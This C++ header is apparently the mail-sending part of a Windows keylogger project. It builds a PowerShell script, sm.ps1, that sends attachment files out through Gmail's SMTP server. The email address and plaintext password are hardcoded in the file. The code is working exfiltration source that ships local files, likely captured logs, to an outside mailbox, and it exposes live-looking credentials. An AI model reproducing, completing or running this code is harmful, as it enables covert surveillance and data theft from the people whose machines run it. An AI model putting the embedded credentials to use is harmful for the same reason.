#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <windows.h>
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail {
    // Email credentials should be stored securely in a configuration file
    #define X_EM_TO "jobs.abt.kl@gmail.com"
    #define X_EM_FROM "jobs.abt.kl@gmail.com"
    #define X_EM_PASS "Jobs.ABt7.KL"

    const std::string &PowerShellScript =
        "Param( \r\n"
        "   [String]$Att,\r\n"
        "   [String]$Subj,\r\n"
        "   [String]$Body\r\n"
        ")\r\n\r\n"
        "Function Send-EMail {\r\n"
        "    Param (\r\n"
        "        [Parameter(`\r\n"
        "            Mandatory=$true)]\r\n"
        "        [String]$To,\r\n"
        "        [Parameter(`\r\n"
        "            Mandatory=$true)]\r\n"
        "        [String]$From,\r\n"
        "        [Parameter(`\r\n"
        "            mandatory=$true)]\r\n"
        "        [String]$Password,\r\n"
        "        [Parameter(`\r\n"
        "            Mandatory=$true)]\r\n"
        "        [String]$Subject,\r\n"
        "        [Parameter(`\r\n"
        "            Mandatory=$true)]\r\n"
        "        [String]$Body,\r\n"
        "        [Parameter(`\r\n"
        "            Mandatory=$true)]\r\n"
        "        [String]$attachment\r\n"
        "    )\r\n"
        "    try {\r\n"
        "        $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n"
        "        $Srv = \"smtp.gmail.com\"\r\n"
        "        if ($attachment -ne $null) {\r\n"
        "            try {\r\n"
        "                $Attachments = $attachment -split (\"\\:\\:\");\r\n"
        "                ForEach ($val in $Attachments) {\r\n"
        "                    $attch = New-Object System.Net.Mail.Attachment($val)\r\n"
        "                    $Msg.Attachments.Add($attch)\r\n"
        "                }\r\n"
        "            }\r\n"
        "            catch {\r\n"
        "                exit 2;\r\n"
        "            }\r\n"
        "        }\r\n"
        "        $Client = New-Object Net.Mail.SmtpClient($Srv, 587)\r\n"
        "        $Client.EnableSsl = $true\r\n"
        "        $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split(\"@\")[0], $Password);\r\n"
        "        $Client.Send($Msg)\r\n"
        "        Remove-Variable -Name Client\r\n"
        "        Remove-Variable -Name Password\r\n"
        "        exit 7;\r\n"
        "    }\r\n"
        "    catch {\r\n"
        "        exit 3;\r\n"
        "    }\r\n"
        "}\r\n"
        "try {\r\n"
        "    Send-EMail -attachment $Att -To \"" + std::string(X_EM_TO) + "\"" +
        " -Body $Body -Subject $Subj -password \"" + std::string(X_EM_PASS) + "\"" +
        " -From \"" + std::string(X_EM_FROM) + "\"\r\n" +
        "}\r\n"
        "catch {\r\n"
        "    exit 4;\r\n"
        "}";

    // SendMail function declaration should be added here
}

#endif // SENDMAIL_H
